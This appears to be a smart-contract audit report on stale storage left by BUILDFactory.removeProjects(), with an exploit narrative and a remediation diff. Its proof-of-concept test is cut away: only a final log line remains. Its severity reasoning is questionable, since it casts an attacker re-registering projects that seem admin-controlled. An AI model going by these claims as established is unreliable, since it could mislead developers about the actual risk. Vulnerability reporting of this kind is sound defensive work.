# Critical Vulnerability: Incomplete State Cleanup on Project Removal Leads to Permanent Fund Lock

## Summary

The `BUILDFactory.removeProjects()` function does not completely clear all data associated with a project upon its removal. While it deletes the core `ProjectConfig` (containing the admin and claim contract addresses), it fails to clear the project's financial ledger stored in `s_tokenAmounts` and other state mappings.

This oversight allows an attacker to re-register a previously removed project's token address and inherit its entire deposit history. Although the attacker cannot directly steal the funds, this action leads to a permanent lock of the original project's deposited assets and a corruption of the factory's internal accounting, representing a critical failure of the contract's state management.

## Vulnerability Details

**Location:** `BUILDFactory.sol#L121-L135`

The `removeProjects` function executes `delete s_projects[token]`. According to Solidity's behavior, this operation only clears the storage slots for the `ProjectConfig` struct. It has no effect on other state variables that use the `token` address as a primary key.

Specifically, the following critical mappings are left untouched:
- `mapping(address token => TokenAmounts config) private s_tokenAmounts;`
- `mapping(address token => mapping(uint256 seasonId => ...)) private s_projectSeasonConfigs;`
- `mapping(address token => mapping(uint256 seasonId => ...)) private s_refundableAmounts;`
- `mapping(address token => Withdrawal) private s_withdrawals;`

Consequently, if a project with a given token address deposits funds, is removed, and then a new project is created with the same token address, the new project entity inherits the `s_tokenAmounts` record of the original project.

## Impact

This vulnerability creates two severe consequences:

1.  **Permanent Fund Lock:** The core impact is that funds deposited by an original project become permanently irrecoverable. The exploit narrative is as follows:
    - A legitimate project deposits funds into its `BUILDClaim` contract. These funds are physically held by that contract.
    - The factory admin removes the project. The funds remain in the original (now orphaned) `BUILDClaim` contract.
    - An attacker registers a new project with the same token address. The factory's stale accounting (`s_tokenAmounts`) grants this new project credit for the old deposits.
    - The attacker schedules a withdrawal based on this stale data. The factory authorizes it.
    - The attacker deploys a *new* `BUILDClaim` contract and attempts to execute the withdrawal. This call will always fail with an `ERC20InsufficientBalance` error because the new contract is empty; the funds are trapped in the old one.
    - Since there is no mechanism to access funds in a deregistered claim contract, the original deposited assets are locked forever.

2.  **State and Accounting Corruption:** The factoryâ€™s internal ledger becomes desynchronized from on-chain reality. It may authorize withdrawals that can never be executed, and its `totalDeposited` record for a token address will be permanently inflated by the stale data, breaking the integrity of its accounting functions like `calcMaxAvailableAmount`.

## Proof of Concept

The following Foundry test (`test/PoC.t.sol`) provides a clear, step-by-step demonstration of how the stale state leads to a permanent fund lock. The test passes because the exploit executes successfully, confirming the vulnerability by hitting the expected final revert.

        console.log("SUCCESS: PoC confirmed. The withdrawal fails, proving the funds in the original contract are permanently locked.");
    }
}
```

## Recommended Remediation

To fully address this vulnerability, the `removeProjects` function must be modified to comprehensively clear all storage associated with the `token` being removed.

```diff
  function removeProjects(
    address[] calldata tokens
  ) external override whenOpen onlyRole(DEFAULT_ADMIN_ROLE) {
    EnumerableSet.AddressSet storage projectsList = s_projectsList;
    // Cache array length outside loop
    uint256 tokensLength = tokens.length;
    for (uint256 i = 0; i < tokensLength; ++i) {
      address token = tokens[i];
      if (!projectsList.remove(token)) {
        revert ProjectDoesNotExist(token);
      }
      delete s_projects[token];
+     delete s_tokenAmounts[token];
+     delete s_withdrawals[token];
+     // Note: Season-related mappings are not cleared here. See further recommendations.

      emit ProjectRemoved(token);
    }
  }
```
**Further Considerations:**
Clearing nested mappings like `s_projectSeasonConfigs` is not straightforward with `delete`. This suggests a potential design limitation where fully removing a project with a history is problematic. Two safer long-term strategies could be:
1.  **Disallow Re-adding:** Maintain a separate mapping to track removed tokens and prevent them from ever being re-added.
2.  **Soft Deletion:** Instead of deleting, add a `status` field to the `ProjectConfig` struct to mark a project as `Deactivated`, preventing any new interactions while preserving its history for archival purposes.

However, as an immediate fix, clearing `s_tokenAmounts` and `s_withdrawals` is essential to prevent the demonstrated fund lock and accounting corruption exploit.
